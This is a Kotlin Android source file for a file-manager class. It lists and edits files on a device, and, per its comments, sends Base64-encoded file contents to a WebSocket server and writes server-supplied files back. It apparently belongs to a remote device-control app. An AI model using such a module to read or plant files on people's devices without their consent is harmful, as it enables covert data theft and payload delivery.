package com.systemlinker.features

import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LocalFileManager {

    fun listFiles(path: String): JSONObject {
        val dir = File(path.ifBlank { "/" })
        val result = JSONObject().put("path", dir.absolutePath)
        val array = JSONArray()

        if (dir.exists() && dir.isDirectory) {
            dir.listFiles()?.forEach { file ->
                val obj = JSONObject()
                obj.put("name", file.name)
                obj.put("isDir", file.isDirectory)
                obj.put("size", file.length())
                obj.put("lastModified", file.lastModified())
                array.put(obj)
            }
        } else {
            result.put("error", "Directory not found or access denied.")
        }
        return result.put("files", array)
    }

    fun getFileInfo(path: String): JSONObject {
        val file = File(path)
        val obj = JSONObject().put("path", file.absolutePath)
        if (file.exists()) {
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            obj.put("exists", true)
            obj.put("isDir", file.isDirectory)
            obj.put("size_bytes", file.length())
            obj.put("last_modified", sdf.format(Date(file.lastModified())))
            obj.put("can_read", file.canRead())
            obj.put("can_write", file.canWrite())
            obj.put("is_hidden", file.isHidden)
        } else {
            obj.put("exists", false)
        }
        return obj
    }

    fun create(path: String, isDir: Boolean): String {
        val file = File(path)
        return try {
            if (isDir) {
                if (file.mkdirs()) "Directory created." else "Failed to create directory."
            } else {
                if (file.createNewFile()) "File created." else "Failed to create file."
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun rename(oldPath: String, newName: String): String {
        val old = File(oldPath)
        val new = File(old.parentFile, newName)
        return if (old.renameTo(new)) "Renamed to $newName" else "Rename failed."
    }

    fun copy(sourcePath: String, destPath: String): String {
        return try {
            val source = File(sourcePath)
            val dest = File(destPath)
            source.copyRecursively(dest, true)
            "Copied successfully."
        } catch (e: Exception) { "Copy error: ${e.message}" }
    }

    fun move(sourcePath: String, destPath: String): String {
        return try {
            val source = File(sourcePath)
            val dest = File(destPath)
            source.copyRecursively(dest, true)
            source.deleteRecursively()
            "Moved successfully."
        } catch (e: Exception) { "Move error: ${e.message}" }
    }

    // Sends file from Client Device to WebSocket Server
    fun readBase64(path: String): String {
        val file = File(path)
        if (!file.exists() || !file.isFile) return "FILE_NOT_FOUND"
        return try {
            val bytes = FileInputStream(file).readBytes()
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) { "ERROR_READING_FILE" }
    }

    // Writes file from WebSocket Server to Client Device
    fun writeBase64(path: String, base64Data: String): String {
        return try {
            val bytes = Base64.decode(base64Data, Base64.DEFAULT)
            FileOutputStream(File(path)).use { it.write(bytes) }
            "File uploaded to device successfully."
        } catch (e: Exception) { "Error writing file: ${e.message}" }
    }
}